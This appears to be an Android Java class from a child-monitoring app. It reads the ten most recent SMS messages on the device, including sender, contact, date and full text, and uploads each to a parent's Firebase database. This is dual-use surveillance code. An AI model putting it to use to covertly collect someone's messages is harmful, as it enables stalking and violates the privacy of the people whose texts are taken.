package sms;

import android.content.Context;
import android.database.Cursor;
import android.provider.Telephony;
import android.util.Log;


import com.example.childmonitoringchildversion.UpdateChildData;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.Date;

public class SMSTrack {


    private String id;
    private String personName;
    private String smsType;
    private String smsDate;
    private String sms;

    FirebaseDatabase firebaseDatabase = FirebaseDatabase.getInstance();
    DatabaseReference databaseReference;

    public SMSTrack(Context context) {
        storeSmsHistory(context);
    }

    private void storeSmsHistory(Context context) {

        databaseReference = firebaseDatabase.getReference(UpdateChildData.userID).child("Child").child(UpdateChildData.child)
                .child("SmsHistory");
        databaseReference.removeValue();
        // reading all data in descending order according to DATE
        String sortOrder = Telephony.Sms.DEFAULT_SORT_ORDER;

        Cursor cursor = context.getContentResolver().query(Telephony.Sms.CONTENT_URI,
                null, null, null, sortOrder);

        //looping through the cursor to add data into arraylist
        int smsCounter = 0;

        try {

            while (cursor.moveToNext()) {
                smsCounter = smsCounter + 1;
                id = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                personName = cursor.getString(cursor.getColumnIndex(Telephony.Sms.PERSON));
                smsType = cursor.getString(cursor.getColumnIndex(Telephony.Sms.TYPE));
                smsDate = cursor.getString(cursor.getColumnIndex(Telephony.Sms.DATE));
                sms = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));



                id =  id.replaceAll("[^a-zA-z0-9]", "");



                //str_call_time = getFormatedDateTime(str_call_time, "HH:mm:ss", "hh:mm ss");

                SimpleDateFormat dateFormatter = new SimpleDateFormat(
                        "dd-MM-yyyy");
                smsDate = dateFormatter.format(new Date(Long.parseLong(smsDate)));

                switch (Integer.parseInt(smsType)) {
                    case Telephony.Sms.MESSAGE_TYPE_INBOX:
                        smsType = "Receive";
                        break;
                    case Telephony.Sms.MESSAGE_TYPE_SENT:
                        smsType = "Send";
                        break;
                    case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                        smsType = "Outbox";
                        break;
                    case Telephony.Sms.MESSAGE_TYPE_FAILED:
                        smsType = "Failed";
                        break;
                }

                SmsHistoryModel smsHistoryModel = new SmsHistoryModel(id, personName ,smsDate , smsType ,sms );
                sendDataToServer(smsHistoryModel);
                if(smsCounter == 10){
                    break;
                }


            }
        } catch (Exception e) {
            Log.i("smsTag" , e.getMessage());
            e.printStackTrace();
        }

    }


    private void sendDataToServer(SmsHistoryModel smsHistoryModel) {

        databaseReference = firebaseDatabase.getReference(UpdateChildData.userID).child("Child").child(UpdateChildData.child)
                .child("SmsHistory")
                .child(smsHistoryModel.getSmsId());
        databaseReference.setValue(smsHistoryModel);
    }
}
